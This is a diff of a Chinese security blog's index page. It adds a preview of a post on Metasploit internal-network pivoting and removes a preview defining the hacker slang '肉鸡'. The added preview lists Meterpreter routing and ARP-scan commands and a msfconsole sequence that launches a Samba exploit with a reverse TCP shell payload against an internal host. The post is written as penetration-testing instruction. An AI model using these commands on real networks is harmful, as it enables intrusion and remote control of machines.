@@ -209,6 +209,72 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/27/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="魏超">
+      <meta itemprop="description" content="胡歌">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ClearLoveの博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/11/27/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">MSF内网渗透测试技巧</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2019-11-27 13:48:26 / 修改时间：16:24:30" itemprop="dateCreated datePublished" datetime="2019-11-27T13:48:26+08:00">2019-11-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="技巧汇总"><a href="#技巧汇总" class="headerlink" title="技巧汇总"></a>技巧汇总</h1><h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>方法一：<pre><code>meterpreter > run get_local_subnets //获取网段<br>meterpreter > run autoroute -s 172.2.175.0/24 //添加路由<br>meterpreter > run autoroute -p //查看路由<br>meterpreter > run autoroute -d -s 172.2.175.0 //删除网段<br>meterpreter > run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。<br>meterpreter > background //后台sessions</code></pre><br>方法二：<pre><code>meterpreter> run get_local_subnets #查看网段/子网<br>Local subnet: 192.168.33.0/255.255.255.0<br>meterpreter> background #转入后台运行<br>msf> route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息<br>msf> route print #查看添加的信息<br>msf> use linux/samba/lsa_transnames_heap #准备向内网目标主机进攻<br>msf> set payload linux/x86/shell/reverse_tcp<br>msf> set LHOST 10.10.1.129 #此处为attacking 主机的外网IP<br>msf> set LPORT 8080<br>msf> set RHOST 192.168.33.132 #内网目标主机<br>msf> exploit<br>也可以使用自动式添加路由模块：<br>msf> load auto_add_route<br>msf> exploit</code></pre></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/11/27/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/22/%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E4%BA%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1031,89 +1097,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="魏超">
-      <meta itemprop="description" content="胡歌">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ClearLoveの博客">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2019/11/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/" class="post-title-link" itemprop="url">网络安全专业术语</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-11-15 11:08:00" itemprop="dateCreated datePublished" datetime="2019-11-15T11:08:00+08:00">2019-11-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-11-20 14:28:08" itemprop="dateModified" datetime="2019-11-20T14:28:08+08:00">2019-11-20</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试基本知识</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>1.肉鸡：<br>所谓“肉鸡”是一种很形象的比喻，比喻那些可以随意被我们控制的电脑，对方可以是WINDOWS系统，也可以是UNIX/LINUX系统，可以是普通的个人电脑，也可以是大型的服务器，我们可以象操作自己的电脑那样来操作它们，而不被对方所发觉。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2019/11/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1164,7 +1147,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
